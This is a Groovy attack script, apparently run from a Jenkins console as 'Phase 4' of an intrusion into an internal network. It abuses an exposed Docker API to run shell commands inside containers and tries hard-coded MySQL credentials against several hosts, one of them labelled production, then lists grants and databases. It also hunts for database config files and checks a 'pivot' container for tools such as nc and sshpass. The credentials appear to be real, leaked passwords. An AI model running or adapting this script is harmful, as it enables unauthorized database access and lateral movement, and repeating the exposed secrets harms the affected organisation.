// Phase 4: Direct JDBC from Jenkins + find MySQL configs in container
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(120000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cid, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + cid + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

println "===== PART A: Jenkins host IP + JDBC test ====="
println "Jenkins hostname: " + "hostname".execute().text.trim()
println "Jenkins IP: " + InetAddress.getLocalHost().getHostAddress()

// Check if MySQL JDBC driver is available
def drivers = []
try {
    Class.forName("com.mysql.jdbc.Driver")
    drivers << "com.mysql.jdbc.Driver"
} catch (e) {}
try {
    Class.forName("com.mysql.cj.jdbc.Driver")
    drivers << "com.mysql.cj.jdbc.Driver"
} catch (e) {}
try {
    Class.forName("org.mariadb.jdbc.Driver")
    drivers << "org.mariadb.jdbc.Driver"
} catch (e) {}
println "JDBC drivers available: " + drivers

if (drivers.size() > 0) {
    def targets = [
        ["DEV_SEARS", "172.27.141.6", 3308, "apifincadodev", "nNzy]Ku2Ah=u%y1I"],
        ["DEV_SEARS_B", "172.27.141.6", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"],
        ["T1PAGOS", "172.27.141.4", 3306, "app_t1", "wUt22Us2CUh#+M="],
        ["PROD_SEARS", "172.27.141.24", 3308, "apifincadob", "nNzy]Ku2Ah=u%y1I"],
    ]
    targets.each { t ->
        def (label, host, port, user, pass) = t
        println "  JDBC ${label}: ${user}@${host}:${port}..."
        try {
            def url = "jdbc:mysql://${host}:${port}/?connectTimeout=5000&socketTimeout=10000"
            def conn = java.sql.DriverManager.getConnection(url, user, pass)
            println "  *** JDBC_AUTH_OK *** ${label}"
            def stmt = conn.createStatement()
            def rs = stmt.executeQuery("SELECT VERSION(), CURRENT_USER(), @@hostname")
            while (rs.next()) {
                println "    VER=${rs.getString(1)} CU=${rs.getString(2)} HN=${rs.getString(3)}"
            }
            rs = stmt.executeQuery("SHOW GRANTS FOR CURRENT_USER()")
            while (rs.next()) { println "    GRANT: ${rs.getString(1)}" }
            rs = stmt.executeQuery("SHOW DATABASES")
            while (rs.next()) { println "    DB: ${rs.getString(1)}" }
            conn.close()
        } catch (e) {
            println "  JDBC_FAIL: ${e.message?.take(200)}"
        }
    }
} else {
    println "NO JDBC DRIVERS - trying socket connect from Jenkins host"
    // Test TCP from Jenkins host
    ["172.27.141.6:3308", "172.27.141.4:3306", "172.27.141.24:3308"].each { target ->
        def (h, p) = target.split(':')
        try {
            def sock = new java.net.Socket()
            sock.connect(new java.net.InetSocketAddress(h, p.toInteger()), 3000)
            println "  TCP_OPEN from Jenkins: ${target}"
            sock.close()
        } catch (e) {
            println "  TCP_FAIL from Jenkins: ${target} | ${e.message}"
        }
    }
}

println ""
println "===== PART B: Find MySQL config files in container ====="
def findCmd = '''
find / -maxdepth 5 \\( -name "*.php" -o -name "*.env" -o -name "*.ini" -o -name "*.conf" -o -name "*.yml" -o -name "*.yaml" -o -name "*.cfg" \\) -exec grep -l -i "mysql\\|3308\\|3310\\|141\\.6\\|141\\.4\\|141\\.24\\|apifincado\\|app_t1\\|payment_t1\\|fincado" {} \\; 2>/dev/null | head -30
'''
println execIn("5b32e909c295", findCmd)

println ""
println "===== PART C: Check pivot03 container for tools ====="
println execIn("3b389d5bf116", "which mysql mysql_config mysqldump ssh sshpass nc ncat python python3 curl 2>/dev/null; rpm -qa 2>/dev/null | grep -i -E 'mysql|mariadb|ssh' | head -20")
